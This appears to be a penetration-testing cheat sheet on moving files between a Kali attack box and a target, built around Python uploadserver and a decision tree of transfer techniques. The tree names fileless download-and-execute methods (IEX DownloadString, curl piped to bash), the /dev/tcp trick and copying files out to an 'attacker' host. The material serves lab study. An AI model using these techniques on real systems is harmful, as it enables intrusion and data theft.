## Receive a multipart file upload

**Run in:** Kali. **Requires:** The uploadserver Python package and a dedicated receiving directory; sender can reach the listener.

```bash
python3 -m uploadserver 8000
```

**What the result establishes:** Confirm the upload endpoint and the file written by the receiving server, then compare size and digest.

**Next check:** Use the /upload endpoint and a multipart files field, then confirm the received file's size and digest in the server directory.

## Commands

**Kali — receive folder**

```bash
python3 -m uploadserver
```

Requires the uploadserver module. Receives multipart uploads at http://KALI_IP:8000/upload; plain http.server cannot receive them.

## If it fails

| Symptom | Check |
| --- | --- |
| A POST is accepted by a different endpoint or no file is saved | An ordinary Python HTTP server is not an upload receiver; authentication, endpoint path and request format must match the installed upload server. |

<Accordion title="Quick Decision Tree">

### Quick Decision Tree

**File Transfers for Linux and Windows**

```text
DOWNLOADING TO WINDOWS:
├── Have PowerShell?    → Invoke-WebRequest or WebClient.DownloadFile
├── Only cmd.exe?       → certutil or bitsadmin
├── Internal network?   → SMB (impacket-smbserver)
├── Need fileless?      → IEX + DownloadString
└── Nothing works?      → Base64 encode/decode via clipboard

DOWNLOADING TO LINUX:
├── Have curl/wget?     → Use them (simplest)
├── Need fileless?      → curl | bash  or  wget -qO- | python3
├── Have Python/PHP?    → Use language one-liners
├── Nothing available?  → /dev/tcp bash trick
└── Need encryption?    → OpenSSL s_server/s_client

UPLOADING FROM WINDOWS:
├── Have PowerShell?    → Invoke-WebRequest -Method PUT (to Nginx)
├── Only cmd.exe?       → certreq.exe -Post (to netcat listener)
├── Internal network?   → SMB or WebDAV
└── Nothing works?      → Base64 encode → copy-paste → decode on attacker

UPLOADING FROM LINUX:
├── Have curl?          → curl -T file (to Nginx PUT) or curl -X POST (to uploadserver)
├── Have SCP?           → scp file user@attacker:/path/
├── Have Python?        → python3 requests.post one-liner
└── Nothing works?      → Start python3 -m http.server on target, wget from attacker
```

### Web Upload (Python uploadserver with HTTPS)

**File Transfers for Linux and Windows**

```bash
# On attack box — create self-signed cert and start server
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```
